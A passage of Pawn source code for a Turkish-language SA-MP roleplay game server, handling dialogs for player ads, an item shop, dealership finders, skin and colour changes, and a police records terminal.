				strcpy(szAdvert[playerid], inputtext, 128);
				GivePlayerCash(playerid, -iLength);
				format(string, sizeof(string), "Tebrikler, $%d'a öncelikli reklamýný verdin!", iLength);
				SendClientMessage(playerid, COLOR_WHITE, string);
			}
			else ShowPlayerDialogEx(playerid, DIALOG_ADMAIN, DIALOG_STYLE_LIST, "Reklamlar", "Reklamlarý Listele\nReklam Ara\nReklam ver\nÖncelikli Reklam Ver", "Seç", "Iptal");
		}

		case DIALOG_ADPLACEP: {
			if(response) {
				if(iAdverTimer >= 1) {
					SendClientMessage(playerid, COLOR_GREY, "Her 30 saniyede yalnýzca bir tane öncelikli reklam verilebilir.");
					return ShowPlayerDialogEx(playerid, DIALOG_ADPLACEP, DIALOG_STYLE_INPUT, "Reklamlar - Öncelikli Reklam",
					"Ýstediðin öncelikli reklam içeriðini gir! 128 karakterin üzerine çýkamazsýn.\nÖncelikli bir reklam olacaðý için, tüm oyuncular görebilecek ve bu sana 800$'a patlayacak.", "Submit", "Geri Don");
				}
				else if(GetPlayerCash(playerid) < 800) {
					ShowPlayerDialogEx(playerid, DIALOG_ADMAIN, DIALOG_STYLE_LIST, "Reklamlar", "Reklamlarý Listele\nReklam Ara\nReklam ver\nÖncelikli Reklam Ver", "Seç", "Iptal");
					return SendClientMessage(playerid, COLOR_GREY, "Bunun için yeterli paran yok.");
				}
				else if(!(2 <= strlen(inputtext) <= 79)) {
					ShowPlayerDialogEx(playerid, DIALOG_ADMAIN, DIALOG_STYLE_LIST, "Reklamlar", "Reklamlarý Listele\nReklam Ara\nReklam ver\nÖncelikli Reklam Ver", "Seç", "Iptal");
					return SendClientMessage(playerid, COLOR_GREY, "Girdiðiniz içerik çok uzun yada çok kýsa.");
				}
				iAdverTimer = 30;
				SetPVarInt(playerid, "adT", 120);
				strcpy(szAdvert[playerid], inputtext, 128);
				GivePlayerCash(playerid, -800);

				new
					szMessage[128];

 				format(szMessage, sizeof(szMessage), "Reklam: %s - Ýletiþim %s (%i)", inputtext, GetPlayerNameEx(playerid), PlayerInfo[playerid][pNumber]);
				SendClientMessageToAllEx(TEAM_GROVE_COLOR, szMessage);

				return SendClientMessage(playerid, COLOR_WHITE, "Tebrikler öncelikli reklamýný baþarýlý bir þekilde verdin.");
			}
			else ShowPlayerDialogEx(playerid, DIALOG_ADMAIN, DIALOG_STYLE_LIST, "Reklamlar", "Reklamlarý Listele\nReklam Ara\nReklam ver\nÖncelikli Reklam Ver", "Seç", "Iptal");
		}
		case DIALOG_ADSEARCH: {
			if(response) {

				if(!(4 <= strlen(inputtext) <= 80))
					return ShowPlayerDialogEx(playerid, DIALOG_ADSEARCH, DIALOG_STYLE_INPUT, "Reklamlar - Ara", "4 ile\n80 karakter arasý olmasý gerekiyor.\n\nAranacak sözcüðü girin.", "Ara", "Geri Don");
				else for(new x; x < 50; ++x) ListItemTrackId[playerid][x] = -1;

				new
					szDialog[2256],
					szSearch[80],
					szBuffer[32],
					iCount;

				strcat(szSearch, inputtext, sizeof(szSearch)); // strfind is a piece of shit when it comes to non-indexed arrays, maybe this'll help.
				foreach(Player, i) if(!isnull(szAdvert[i])) {
					// printf("[ads] [NAME: %s] [ID: %i] [AD: %s] [SEARCH: %s]", GetPlayerNameEx(i), i, szAdvert[i], szSearch);
					if(strfind(szAdvert[i], szSearch, true) != -1 && iCount < 50) {
						// printf("[ads - MATCH] [NAME: %s] [ID: %i] [AD: %s] [SEARCH: %s] [COUNT: %i] [DIALOG LENGTH: %i] [FINDPOS: %i]", GetPlayerNameEx(i), i, szAdvert[i], szSearch, iCount, strlen(szDialog), strfind(szAdvert[i], szSearch, true));
						strcpy(szBuffer, szAdvert[i], sizeof(szBuffer));
						if(AdminDuty[playerid] == 0) format(szDialog, sizeof(szDialog), "%s%s... (%i)\r\n", szDialog, szBuffer, PlayerInfo[i][pNumber]);
						else format(szDialog, sizeof(szDialog), "%s%s... (%s)\r\n", szDialog, szBuffer, GetPlayerNameEx(i));
						ListItemTrackId[playerid][iCount++] = i;
					}
				}
				if(!isnull(szDialog)) ShowPlayerDialogEx(playerid, DIALOG_ADSEARCHLIST, DIALOG_STYLE_LIST, "Reklamlar - Arama Sonuçlarý", szDialog, "Seç", "Geri Don");
				else ShowPlayerDialogEx(playerid, DIALOG_ADSEARCHLIST, DIALOG_STYLE_INPUT, "Reklamlar - Ara", "Sonuç bulunamadý.\n\nAranacak sözcüðü girin.", "Ara", "Geri Don");

			}
   				else ShowPlayerDialogEx(playerid, DIALOG_ADMAIN, DIALOG_STYLE_LIST, "Reklamlar", "Reklamlarý Listele\nReklam Ara\nReklam ver\nÖncelikli Reklam Ver", "Seç", "Iptal");
		}
		case DIALOG_ADSEARCHLIST: if(response) {

			new
				i = ListItemTrackId[playerid][listitem],
				szDialog[164];

			if(IsPlayerConnected(i) && !isnull(szAdvert[i])) {
				format(szDialog, sizeof(szDialog), "%s\r\nÝletiþim: %i", szAdvert[i], PlayerInfo[i][pNumber]);
				ShowPlayerDialogEx(playerid, DIALOG_ADFINAL, DIALOG_STYLE_MSGBOX, "Reklamlar - Arama Sonucu", szDialog, "Geri Don", "Exit");
			}
			else SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu ya oyundan düþtü, ya da reklam vermeyi býraktý.");
		}
		case DIALOG_ADFINAL: {
			if(response) return ShowPlayerDialogEx(playerid, DIALOG_ADMAIN, DIALOG_STYLE_LIST, "Reklamlar", "Reklamlarý Listele\nReklam Ara\nReklam ver\nÖncelikli Reklam Ver", "Seç", "Iptal");
		}
		case DIALOG_ADLIST: {
			if(response) {

				new
					i = ListItemTrackId[playerid][listitem],
					szDialog[164];

				if(IsPlayerConnected(i) && !isnull(szAdvert[i])) {
					format(szDialog, sizeof(szDialog), "%s\r\nÝletiþim: %i", szAdvert[i], PlayerInfo[i][pNumber]);
					return ShowPlayerDialogEx(playerid, DIALOG_ADFINAL, DIALOG_STYLE_MSGBOX, "Reklamlar - Arama Sonucu", szDialog, "Geri Don", "Exit");
				}
				else SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu ya oyundan düþtü, ya da reklam vermeyi býraktý.");
			}
			else ShowPlayerDialogEx(playerid, DIALOG_ADMAIN, DIALOG_STYLE_LIST, "Reklamlar", "Reklamlarý Listele\nReklam Ara\nReklam ver\nÖncelikli Reklam Ver", "Seç", "Iptal");
		}
	}
	if(dialogid == STOREMENU2)
	{
		if(response)
		{
			if(listitem == 0)
			{
				if(GetPlayerCash(playerid) >= 50)
				{
					new randphone = 1000 + random(99999);//minimum 1000  max 99999
					ReplacePH(PlayerInfo[playerid][pNumber], randphone);
					PlayerInfo[playerid][pNumber] = randphone;
 					PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
					PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);
					GetPlayerIp(playerid, PlayerInfo[playerid][pIP], 32);
					GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
					GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);
					OnPlayerStatsUpdate(playerid);
					format(string, sizeof(string), "Telefon satýn alýndý, yeni telefon numaran %d.", randphone);
					SendClientMessage(playerid, COLOR_GRAD4, string);
					SendClientMessage(playerid, COLOR_GRAD5, "Telefonun bilgini /karakterim yazarak daima görebilirsin.");
					SendClientMessage(playerid, COLOR_WHITE,"IPUCU: /telefonyardim yazarak telefon komutlarýný görebilirsin.");
					GivePlayerCash(playerid, -50);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "Bu eþya için yeterli paran yok.");
				}
			}
			if(listitem == 1)
			{
				if(GetPlayerCash(playerid) >= 25)
				{
					PlayerInfo[playerid][pPhoneBook] = 1;
					format(string, sizeof(string), "Telefon defteri satýn alýndý. Diðer oyuncularýn telefon numarasýna bakabilirsin..");
					SendClientMessage(playerid, COLOR_GRAD4, string);
					SendClientMessage(playerid, COLOR_WHITE,"IPUCU: /numara <id/isim>.");
					GivePlayerCash(playerid, -25);
				}
				else
				{
				SendClientMessage(playerid, COLOR_GRAD4, "Bu eþya için yeterli paran yok.");
				}
			}
			if(listitem == 2)
			{
				if(GetPlayerCash(playerid) >= 50)
				{
					PlayerInfo[playerid][pDice] = 1;
					format(string, sizeof(string), "Zar satýn alýndý.");
					SendClientMessage(playerid, COLOR_GRAD4, string);
					SendClientMessage(playerid, COLOR_WHITE,"IPUCU: /zarat yazarak zar atabilirsin.");
					GivePlayerCash(playerid, -50);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "Bu eþya için yeterli paran yok.");
				}
			}
			if(listitem == 3)
			{
				if(GetPlayerCash(playerid) >= 5)
				{
					Condom[playerid] ++;
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					format(string, sizeof(string), "Prezervatif alýndý.");
					SendClientMessage(playerid, COLOR_GRAD4, string);
					GivePlayerCash(playerid, -5);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "Bu eþya için yeterli paran yok.");
				}
			}
			if(listitem == 4)
			{
				if(GetPlayerCash(playerid) >= 5)
				{
					GivePlayerCash(playerid, -50);
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					SendClientMessage(playerid, COLOR_GRAD4, "CD Player satin alindi.");
					SendClientMessage(playerid, COLOR_WHITE,"IPUCU: /muzik yaz.");
					PlayerInfo[playerid][pCDPlayer] = 1;
					GivePlayerCash(playerid, -5);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "Bu eþya için yeterli paran yok.");
				}
			}
			if(listitem == 5)
			{
				if(GetPlayerCash(playerid) >= 20)
				{
					if(PlayerInfo[playerid][pSpraycan] < 20) {
						PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
						PlayerInfo[playerid][pSpraycan] += 10;
						SendClientMessage(playerid, COLOR_GRAD4, "10 Araçboyasý alýndý.");
						SendClientMessage(playerid, COLOR_WHITE,"IPUCU: Aracýn içerisindeyken /araciboya ve /boyaisi komutlariyla aracini boyayabilirsin.");
						GivePlayerCash(playerid, -20);
					}
					else SendClientMessage(playerid, COLOR_GRAD4, "Bu eþyadan daha fazla bulunduramazsýn.");
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "Bu eþya için yeterli paran yok.");
				}
			}
			if(listitem == 6)
			{
				if(GetPlayerCash(playerid) >= 100)
				{
					if(PlayerInfo[playerid][pRope] < 8) {
						PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
						PlayerInfo[playerid][pRope] += 3;
						SendClientMessage(playerid, COLOR_GRAD4, "3 Ropes purchased.");
						SendClientMessage(playerid, COLOR_WHITE,"IPUCU: Birini baðlamak için araç sürerken /bagla yaz.");
						GivePlayerCash(playerid, -100);
					}
					else SendClientMessage(playerid, COLOR_GRAD4, "Bu eþyadan daha fazla bulunduramazsýn.");
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "Bu eþya için yeterli paran yok.");
				}
			}
			if(listitem == 7)
			{
				if(GetPlayerCash(playerid) >= 5)
				{
				    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					PlayerInfo[playerid][pCigar] = 10;
					SendClientMessage(playerid, COLOR_GRAD4, "10 sigara satýn alýndý.");
					SendClientMessage(playerid, COLOR_WHITE,"IPUCU: Sigara yakmak için /sigara komutunu kullan. Ýçmek için ise mousenin sol tuþuna bas. Fýrlatmak için ise F tuþuna bas.");
					GivePlayerCash(playerid, -5);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "Bu eþya için yeterli paran yok.");
				}
			}
			if(listitem == 8) {
				if(GetPlayerCash(playerid) >= 1) {
				    if(PlayerInfo[playerid][pSprunk] >= 10)
				        return SendClientMessage(playerid, COLOR_GREY, "Daha fazla gazoz taþýyamazsýn.");

				    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					PlayerInfo[playerid][pSprunk] += 1;
					SendClientMessage(playerid, COLOR_GRAD4, "Gazoz satin alindi.");
					SendClientMessage(playerid, COLOR_WHITE,"IPUCU: Gazoz içnmek için /gazozic yaz ve mousenin sol tuþuna basarak iç. Atmak için ise F tuþuna bas.");
					GivePlayerCash(playerid, -1);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "Bu eþya için yeterli paran yok.");
				}
			}
			if(listitem == 9)
			{
				if(GetPlayerCash(playerid) >= 500)
				{
				    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					PlayerInfo[playerid][pRadio] = 1;
					PlayerInfo[playerid][pRadioFreq] = 1;
					SendClientMessage(playerid, COLOR_GRAD4, "Portatif radyo satýn alýndý.");
					SendClientMessage(playerid, COLOR_WHITE,"IPUCU: Portatif radyondan konuþmak için /pr komutunu kullan.");
					SendClientMessage(playerid, COLOR_WHITE,"IPUCU: Radyo frekansýný deðiþtirmek için /frekans komutunu kullan.");
					GivePlayerCash(playerid, -500);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "Bu eþya için yeterli paran yok.");
				}
			}
			if(listitem == 10)
			{
				if(GetPlayerCash(playerid) >= 20)
				{
				    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					GivePlayerValidWeapon(playerid, 43, 99999);
					SendClientMessage(playerid, COLOR_GRAD4, "Kamera satýn alýndý.");
					SendClientMessage(playerid, COLOR_WHITE,"IPUCU: Resim çekerken vizörden bakmayý unutmayýn.");
					GivePlayerCash(playerid, -20);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "Bu eþya için yeterli paran yok.");
				}
			}
			if(listitem == 11)
			{
				if(GetPlayerCash(playerid) >= 50)
				{
				    if(PlayerInfo[playerid][pBlindfold] >= 5)
					    return SendClientMessage(playerid, COLOR_WHITE, "Daha fazla Göz Bandanasý taþýyamazsýn.");

				    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					PlayerInfo[playerid][pBlindfold] += 1;
					SendClientMessage(playerid, COLOR_GRAD4, "Göz bandanasý satýn alýndý.");
					SendClientMessage(playerid, COLOR_WHITE,"Artýk /gozbagla ile birilerinin gözünü baðlayabilirsin.");
					GivePlayerCash(playerid, -50);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "Bu eþya için yeterli paran yok.");
				}
			}
			if(listitem == 12)
			{
				if(GetPlayerCash(playerid) >= 50)
				{
				    if(PlayerInfo[playerid][pGas] >= 10)
				        return SendClientMessage(playerid, COLOR_WHITE, "Daha fazla benzin bidonu taþýyamazsýn!");

				    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					PlayerInfo[playerid][pGas] += 1;
					SendClientMessage(playerid, COLOR_GRAD4, "1 adet benzin bidonu satýn alýndý!");
					SendClientMessage(playerid, COLOR_WHITE,"Aracýnýzý benzinle doldurmak için /bidonkullan yazmalýsýnýz.");
					GivePlayerCash(playerid, -50);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD4, "Bu eþya için yeterli paran yok.");
				}
			}
		}
	}
	if(dialogid == FINDDEALERSHIPMENU)
	{
		if(response)
		{
			new
				szMessage[128];
			SetPlayerCheckpoint(playerid, CarDealershipInfo[listitem][cdEntranceX], CarDealershipInfo[listitem][cdEntranceY], CarDealershipInfo[listitem][cdEntranceZ], 3);
			format(szMessage, sizeof(szMessage), "%s'ý seçtin. Haritandaki kýrmýzý noktaya git.", CarDealershipInfo[listitem][cdMessage]);
			SendClientMessage(playerid, COLOR_WHITE, szMessage);
			FindingDealership[playerid] = 1;
		}
	}
	if(dialogid == FINDCARTUNINGMENU)
	{
		if(response) {
			switch(listitem) {
				case 0: {
					SetPlayerCheckpoint(playerid, -1935.7700, 228.7900, 34.1563, 3);
					SendClientMessage(playerid, COLOR_WHITE, "San Fierro'daki araç modifiyecisini seçtin. Haritandaki kýrmýzý noktaya git.");
					FindingDealership[playerid] = 1; // Using this because it's pointless to make another variable.
				} case 1: {
					SetPlayerCheckpoint(playerid, -2707.4482, 218.9819, 4.1797, 3);
					SendClientMessage(playerid, COLOR_WHITE, "San Fierro'daki Arch Angels araç modifiyecisini seçtin. Haritandaki kýrmýzý noktaya git.");
					FindingDealership[playerid] = 1; // Using this because it's pointless to make another variable.
				} case 2: {
					SetPlayerCheckpoint(playerid, 2645.6418, -2028.8173, 13.5469, 3);
					SendClientMessage(playerid, COLOR_WHITE, "LowRider tipi araç modifiyecisini seçtin. Haritandaki kýrmýzý noktaya git.");
					FindingDealership[playerid] = 1; // Using this because it's pointless to make another variable.
				} case 3: {
					SetPlayerCheckpoint(playerid, 1041.2914, -1036.4375, 31.7365, 3);
					SendClientMessage(playerid, COLOR_WHITE, "Los Santos'daki araç modifiyecisini seçtin. Haritandaki kýrmýzý noktaya git.");
					FindingDealership[playerid] = 1; // Using this because it's pointless to make another variable.
				} case 4: {
					SetPlayerCheckpoint(playerid, 2387.5823, 1036.0345, 10.8203, 3);
					SendClientMessage(playerid, COLOR_WHITE, "Las Venturas'taki araç modifiyecisini seçtin. Haritandaki kýrmýzý noktaya git.");
					FindingDealership[playerid] = 1; // Using this because it's pointless to make another variable.
				}
			}
		}
	}
	if(dialogid == COLORMENU)
	{
		if(response)
		{
			if(listitem == 0)
			{
				SetPlayerColor(playerid,COLOR_DBLUE);
				SendClientMessage(playerid, COLOR_DBLUE, "Rengin mavi olarak deðiþtirildi!");
			}
			if(listitem == 1)
			{
				SetPlayerColor(playerid,COLOR_BLACK);
				SendClientMessage(playerid, COLOR_BLACK, "Rengin siyah olarak deðiþtirildi!");
			}
			if(listitem == 2)
			{
				SetPlayerColor(playerid,COLOR_RED);
				SendClientMessage(playerid, COLOR_RED, "Rengin kýrmýzý olarak deðiþtirildi!");
			}
			if(listitem == 3)
			{
				SetPlayerColor(playerid,TEAM_ORANGE_COLOR);
				SendClientMessage(playerid, TEAM_ORANGE_COLOR, "Rengin turuncu olarak deðiþtirildi!");
			}
			if(listitem == 4)
			{
				SetPlayerColor(playerid,COLOR_PINK);
				SendClientMessage(playerid, COLOR_PINK, "Rengin pembe olarak deðiþtirildi!");
			}
			if(listitem == 5)
			{
				SetPlayerColor(playerid,COLOR_PURPLE);
				SendClientMessage(playerid, COLOR_PURPLE, "Rengin mor olarak deðiþtirildi!");
			}
			if(listitem == 6)
			{
				SetPlayerColor(playerid,COLOR_GREEN);
				SendClientMessage(playerid, COLOR_GREEN, "Rengin yeþil olarak deðiþtirildi!");
			}
			if(listitem == 7)
			{
				SetPlayerColor(playerid,COLOR_YELLOW);
				SendClientMessage(playerid, COLOR_YELLOW, "Rengin sarý olarak deðiþtirildi!");
			}
			if(listitem == 8)
			{
				SetPlayerColor(playerid,COLOR_WHITE);
				SendClientMessage(playerid, COLOR_WHITE, "Rengin beyaz olarak deðiþtirildi!");
			}
		}
	}
	if(dialogid == 3495) {
		new skinid = strval(inputtext);

		if(!response)
		    return 1;

        if(IsValidSkin(skinid) == 0 && PlayerInfo[playerid][pDonator] < 1) {
			SendClientMessage(playerid, COLOR_GREY, "Girilen skin ID yanlýþ yada bir oluþum & aileye ait.");
   			ShowPlayerDialogEx(playerid, 3495, DIALOG_STYLE_INPUT, "Skin Seçimi","Lütfen bir Skin ID'si girin\n\nUyarý: Skin deðiþimleri 250$'dýr.", "Satýn Al", "Iptal");
		} else {
			if(GetPlayerCash(playerid) < 250 && PlayerInfo[playerid][pFaction] == 0 && PlayerInfo[playerid][pLeader] == 0)
			   	return SendClientMessage(playerid, COLOR_GRAD2, "Bu kýyafetlerin parasýný karþýlayamýyorsun.");

			if(PlayerInfo[playerid][pDonator] > 0 && IsInvalidSkin(skinid)) {
			    ShowPlayerDialogEx(playerid, 3495, DIALOG_STYLE_INPUT, "Skin Seçimi","Lütfen bir Skin ID'si girin\n\nUyarý: Skin deðiþimleri VIP'lere bedavadýr.", "Satýn Al", "Iptal");
			    return SendClientMessage(playerid, COLOR_GREY, "Yanlýþ skin ID'si, tekrar deneyin.");
			}

			if(PlayerInfo[playerid][pFaction] == 0 && PlayerInfo[playerid][pLeader] == 0 && PlayerInfo[playerid][pDonator] == 0) {
				GivePlayerCash(playerid, -250);
				GameTextForPlayer(playerid, "~g~Skin satin alindi ~n~ ~r~- $250", 2000, 1);
			} else {
			    GameTextForPlayer(playerid, "~g~Skin degistirildi", 2000, 1);
			}

			PlayerInfo[playerid][pSkin] = skinid;
			SetPlayerSkin(playerid, skinid);
  		}
		return 1;
	}
	// MVB System
	if(dialogid == MDC_MAIN && response)
	{//*Memur Bul\n*Sivil Bilgisi\n*Law Enforcement Agencies\n*Options
 		if(!IsMDCPermitted(playerid)) return SendClientMessage(playerid, COLOR_LIGHTBLUE, " Giriþ Baþarýsýz. MVB'i kullanma izniniz yok!");
	   	switch(listitem)
	    {
	        case 0:
	        {
	            ShowPlayerDialogEx(playerid, MDC_FIND, DIALOG_STYLE_INPUT, "SA-MVB - Giriþ yapýldý | Memur GPS Yeri", "Bir devlet memuru adý yada ID'si girin.", "Gir", "Iptal");
	        }
	        case 1:
	        {
	            ShowPlayerDialogEx(playerid, MDC_CIVILIANS, DIALOG_STYLE_LIST, "*SA-MVB - Giriþ yapýldý | Sivil Seçenekleri", "*Kayit Kontrol\n*Lisanslar\n*Tutuklama Emirleri\n*Tutuklama Emri Koy\n*BOLO\n*BOLO Oluþtur\n*Sil", "Tamam", "Iptal");
	        }
	        case 2:
	        {
	            ShowPlayerDialogEx(playerid, MDC_MEMBERS, DIALOG_STYLE_LIST, "SA-MVB - Giriþ yapýldý | Birim Listesi", "*LSPD\n*FBI\n*LSFMD\n*GOV", "Tamam", "Iptal");
	        }
		}
	}
	if(dialogid == MDC_FIND && response)
	{
	    new giveplayerid;
		if(!IsMDCPermitted(playerid)) return SendClientMessage(playerid, COLOR_LIGHTBLUE, " Giriþ Baþarýsýz. MVB'i kullanma izniniz yok!");
		if(sscanf(inputtext, "u", giveplayerid))
		{
			ShowPlayerDialogEx(playerid, MDC_FIND, DIALOG_STYLE_INPUT, "SA-MVB - Giriþ yapýldý | Memur GPS Yeri", "Bir devlet memuru adý yada ID'si girin.", "Gir", "Iptal");
			return 1;
		}

		if(IsPlayerConnected(giveplayerid))
		{
			if(giveplayerid != INVALID_PLAYER_ID)
			{
				if(giveplayerid == playerid)
				{
				    ShowPlayerDialogEx(playerid, MDC_FIND, DIALOG_STYLE_INPUT, "SA-MVB - Giriþ Yapýldý | HATA", "Hata: Kendi kendini bulamazsýn.\nBir memur ismi yada ID'si gir.", "Gir", "Iptal");

					return 1;
				}
				if(PlayerInfo[giveplayerid][pFaction] == 1|| PlayerInfo[giveplayerid][pLeader] == 1 || PlayerInfo[giveplayerid][pFaction] == 2 || PlayerInfo[giveplayerid][pLeader] == 2)
				{
				    if(AdminDuty[giveplayerid] != 0)
				        return SendClientMessage(playerid, COLOR_GREY, "Ýþbaþýnda olan bir adminin yerini bulamazsýn.");

	    			SetPlayerMarkerForPlayer(playerid,giveplayerid,FIND_COLOR);
                    FindingPlayer[playerid] = giveplayerid;
		    		FindTime[playerid] = 1;
		    		FindTimePoints[playerid] = 30;
		    	}
		    	else
		    	{
			    	SendClientMessage(playerid, COLOR_GRAD2, "Sadece diðer memurlarý bulabilirsin!");
		    	}
			}
		}
	}
	if(dialogid == MDC_CIVILIANS && response)
	{ //*Check Record\n*Licenses\nWarrants\n*Issue Warrant
		new WarrantString[512];
	 	if(!IsMDCPermitted(playerid)) return SendClientMessage(playerid, COLOR_LIGHTBLUE, " Giriþ Baþarýsýz. MVB'i kullanma izniniz yok!");
		if(News[hTaken6] == 1)
		{
			format(string, sizeof(string), "%s :: Memur: %s\n", News[hAdd6], News[hContact6]);
			strcat(WarrantString, string, sizeof(WarrantString));
		}
		if(News[hTaken7] == 1)
		{
			format(string, sizeof(string), "%s :: Memur: %s\n", News[hAdd7], News[hContact7]);
			strcat(WarrantString, string, sizeof(WarrantString));
		}
		if(News[hTaken8] == 1)
		{
			format(string, sizeof(string), "%s :: Memur: %s\n", News[hAdd8], News[hContact8]);
		    strcat(WarrantString, string, sizeof(WarrantString));
		}
		if(News[hTaken9] == 1)
		{
			format(string, sizeof(string), "%s :: Memur: %s\n", News[hAdd9], News[hContact9]);
			strcat(WarrantString, string, sizeof(WarrantString));
		}
		if(News[hTaken10] == 1)
		{
			format(string, sizeof(string), "%s :: Memur: %s\n", News[hAdd10], News[hContact10]);
			strcat(WarrantString, string, sizeof(WarrantString));
		}
		if(News[hTaken11] == 1)
		{
			format(string, sizeof(string), "%s :: Memur: %s\n", News[hAdd11], News[hContact11]);
			strcat(WarrantString, string, sizeof(WarrantString));
		}
		if(News[hTaken12] == 1)
		{
			format(string, sizeof(string), "%s :: Memur: %s\n", News[hAdd12], News[hContact12]);
			strcat(WarrantString, string, sizeof(WarrantString));
		}
		if(News[hTaken13] == 1)
		{
			format(string, sizeof(string), "%s :: Memur: %s\n", News[hAdd13], News[hContact13]);
			strcat(WarrantString, string, sizeof(WarrantString));
		}
		if(strlen(WarrantString) == 0)
		{
		    strcat(WarrantString, "Þuanda aktif bir emir yok.", sizeof(WarrantString));
		}
		switch(listitem)
		{
		    case 0: ShowPlayerDialogEx(playerid, MDC_CHECK, DIALOG_STYLE_INPUT, "SA-MVB - Giriþ yapýldý | Records Check", "Kiþinin adýný yada ID'sini girin.", "Gir", "Iptal");
		    case 1: ShowPlayerDialogEx(playerid, MDC_LICENSES, DIALOG_STYLE_INPUT, "SA-MVB - Giriþ yapýldý | Lisans Kontrol", "Kiþinin adýný yada ID'sini girin.", "Gir", "Iptal");
			case 2: ShowPlayerDialogEx(playerid, MDC_WARRANTS, DIALOG_STYLE_LIST, "SA-MVB - Giriþ yapýldý | Emir Listesi", WarrantString, "Gir", "Iptal");
			case 3: ShowPlayerDialogEx(playerid, MDC_ISSUE_SLOT, DIALOG_STYLE_LIST, "SA-MVB - Giriþ yapýldý | Hangi slotu kullanmak istiyorsun?", "1\n2\n3\n4\n5\n6\n7\n8", "Gir", "Iptal");
		    case 4:
		    {
				new BOLOString[512];
				if(News[hTaken14] == 1)
				{
					format(string, sizeof(string), "%s :: Memur: %s\n", News[hAdd14], News[hContact14]);
					strcat(BOLOString, string, sizeof(BOLOString));
				}
				if(News[hTaken15] == 1)
				{
					format(string, sizeof(string), "%s :: Memur: %s\n", News[hAdd15], News[hContact15]);
					strcat(BOLOString, string, sizeof(BOLOString));
				}
				if(News[hTaken16] == 1)
				{
					format(string, sizeof(string), "%s :: Memur: %s\n", News[hAdd16], News[hContact16]);
				    strcat(BOLOString, string, sizeof(BOLOString));
				}
				if(News[hTaken17] == 1)
				{
					format(string, sizeof(string), "%s :: Memur: %s\n", News[hAdd17], News[hContact17]);
					strcat(BOLOString, string, sizeof(BOLOString));
				}
				if(News[hTaken18] == 1)
				{
					format(string, sizeof(string), "%s :: Memur: %s\n", News[hAdd18], News[hContact18]);
					strcat(BOLOString, string, sizeof(BOLOString));
				}
				if(News[hTaken19] == 1)
				{
					format(string, sizeof(string), "%s :: Memur: %s\n", News[hAdd19], News[hContact19]);
					strcat(BOLOString, string, sizeof(BOLOString));
				}
				if(News[hTaken20] == 1)
				{
					format(string, sizeof(string), "%s :: Memur: %s\n", News[hAdd20], News[hContact20]);
					strcat(BOLOString, string, sizeof(BOLOString));
				}
				if(News[hTaken21] == 1)
				{
					format(string, sizeof(string), "%s :: Memur: %s\n", News[hAdd21], News[hContact21]);
					strcat(BOLOString, string, sizeof(BOLOString));
				}
				if(strlen(BOLOString) == 0)
				{
				    strcat(BOLOString, "Þuanda BOLO yok.", sizeof(BOLOString));
				}
				ShowPlayerDialogEx(playerid, MDC_BOLOLIST, DIALOG_STYLE_LIST, "SA-MVB - Giriþ yapýldý | BOLO Listesi", BOLOString, "Tamam", "Iptal");
		    }
		    case 5:
		    {
		    	ShowPlayerDialogEx(playerid, MDC_BOLO_SLOT, DIALOG_STYLE_LIST, "SA-MVB - Giriþ yapýldý | Hangi slotu kullanmak istiyorsun?", "1\n2\n3\n4\n5\n6\n7\n8", "Gir", "Iptal");
		    }
		    case 6:
	        {
	        	ShowPlayerDialogEx(playerid, MDC_DELETE, DIALOG_STYLE_LIST, "SA-MVB - Giriþ yapýldý | Sil", "*BOLO\n*Emir", "Tamam", "Iptal");
	        }
		}

	}
	if(dialogid == MDC_MEMBERS && response)
	{
	    if(!IsMDCPermitted(playerid)) return SendClientMessage(playerid, COLOR_LIGHTBLUE, " Giriþ Baþarýsýz. MVB'i kullanma izniniz yok!");
		new MemberString[1024], giveplayer[MAX_PLAYER_NAME];
		new rank[64], division[64], employer[64];
		if(listitem == 0)
		{
			foreach(Player, i)
			{
			    giveplayer = GetPlayerNameEx(i);
				if(PlayerInfo[i][pFaction] == 1)
				{
				    GetPlayerFactionInfo(i, rank, division, employer);
					//GetPlayerName(i, giveplayer, sizeof(giveplayer));
					format(string, sizeof(string), "* %s (%s) %s Ph: %d\n", rank, division,  giveplayer, PlayerInfo[i][pNumber]);
					strcat(MemberString, string, sizeof(MemberString));
				}
			}
			if(strlen(MemberString) == 0)
			{
			    strcat(MemberString, "Þuanda online üye yok.", sizeof(MemberString));
			}
			ShowPlayerDialogEx(playerid, MDC_LSPD, DIALOG_STYLE_LIST, "SA-MVB - Giriþ yapýldý | LSPD Uyeleri", MemberString, "Seç", "Iptal");
		}
		else if(listitem == 1)
		{
			foreach(Player, i)
			{
			    giveplayer = GetPlayerNameEx(i);
			    if(PlayerInfo[i][pFaction] == 2)
				{
				    GetPlayerFactionInfo(i, rank, division, employer);
					//GetPlayerName(i, giveplayer, sizeof(giveplayer));
					format(string, sizeof(string), "* %s (%s) %s Ph: %d\n", rank, division,  giveplayer, PlayerInfo[i][pNumber]);
